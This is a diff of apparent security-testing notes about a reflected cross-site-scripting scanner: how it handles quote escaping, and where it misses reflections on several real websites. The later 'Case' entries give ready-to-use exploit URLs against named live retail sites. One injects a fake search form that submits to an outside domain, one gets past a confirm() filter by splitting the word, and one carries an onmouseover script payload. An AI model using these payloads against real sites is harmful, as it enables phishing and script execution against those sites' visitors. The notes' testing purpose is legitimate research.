@@ -224,13 +224,31 @@ ISSUE 18:
     d. 
 
 ISSUE 19:
+1. https://www.unicef.de/suche?search=%22xyz%27yxz%3C
+2.  <script type="text/javascript">
+    $(function() {
+	    $.get("/campaign/check/unicef/19892?search=%2522xyz'yxz%253C");
+    });
+    </script>
+3. Single Quotes Mitigation Present, But One Regex can't pick it, Shall we use multiple..??
+4. Using multiple regex may become an ADHOC.
+5. 
+
+ISSUE 20:
+1. https://www.pullcast.eu/search?product=%22;%20confirm`1`;%20%22
+2. $('.filter-text').removeClass('hidden').text('"; CONFIRM`1`; "').css('text-transform','uppercase');
+3. filter:'."; confirm`1`; "'});
+4. Mitigation of Double Quotes with Single Quotes Outside. 
+
+
+ISSUE 21:
 1. https://www.airbnb.com.br
 2. script context.2 has more than 1 occurence of xyz , where one of them has quotes encapsulations and others don't.
 3. the program returns as mitigation is present in the form of quotes encapsulation. 
 4. however it can be like that, e.g; if one of the appearance in the same script tag doesn't have mitigation..? 
 5. Right..!! Come to think of it. ..!!
 
-ISSUE Z: [I myself didn't understand the scheme here.. single quotes inside a bracket '[' ..? ]
+ISSUE 22: [I myself didn't understand the scheme here.. single quotes inside a bracket '[' ..? ]
 1. script double quotes encapsulation. why it missed.. 
     a. https://www.airbnb.com.br/s/all?refinement_paths[]=/uvw%22xyz%27yxz%3Czxy&query=
     b. \"refinementPaths\":[\"/uvw\\\"xyz'yxz\u003czxy\"],
@@ -251,19 +269,19 @@ Task 1:
 ----------------------------------------------------------------------------------------------------------------------------
 ----------------------------------------------------------------------------------------------------------------------------
 
-Special Case 1:
+Case 1:
 1. https://www.borsheims.com/
 2. Payload: 
 </span></h1><div style="background-color:lightblue;"><h1>DrudgeReport Form</h1><form action="//www.drudgereportArchives.com/dsp/search.htm" method="GET" name="searchForm" target="_top" style="margin:0px;padding:0px;"> 			 			<input type="Text" class="dra" name="searchFor" size="20" maxlength="500" value=""> 			<input type="Submit" value="Search Archives" class="dra"> 		</form></div><h1><span><!--
 3. Exploitable Link with Paylaod: 
 https://www.borsheims.com/product-search?Search=%3C%2Fspan%3E%3C%2Fh1%3E%3Cdiv+style%3D%22background-color%3Alightblue%3B%22%3E%3Ch1%3EDrudgeReport+Form%3C%2Fh1%3E%3Cform+action%3D%22%2F%2Fwww.drudgereportArchives.com%2Fdsp%2Fsearch.htm%22+method%3D%22GET%22+name%3D%22searchForm%22+target%3D%22_top%22+style%3D%22margin%3A0px%3Bpadding%3A0px%3B%22%3E+%09%09%09+%09%09%09%3Cinput+type%3D%22Text%22+class%3D%22dra%22+name%3D%22searchFor%22+size%3D%2220%22+maxlength%3D%22500%22+value%3D%22%22%3E+%09%09%09%3Cinput+type%3D%22Submit%22+value%3D%22Search+Archives%22+class%3D%22dra%22%3E+%09%09%3C%2Fform%3E%3C%2Fdiv%3E%3Ch1%3E%3Cspan%3E%3C%21--
 
-Special Case 2:
+Case 2:
 1. Exploitable Link:
 https://www.tatsoul.com/supplies/index.php?main_page=advanced_search&search_in_description=1&keyword=xyz%27;%20conf%3Cirm(1);%20%27&inc_subcat=0&sort=20a
 2. filtering alert, prompt, confirm and also <  So I used conf<irm :)
 
-Special Case 3:
+Case 3:
 1. Exploitable Link:
 https://www.petdoors.com/catalogsearch/result?q=%22/%3Exyz%3Cinput%20type=%22submit%22%20onmouseover=%22alert(1)%22/%3E%3C!--
 2. filtering alert, confirm, prompt script in upper and lower case mixed.. 
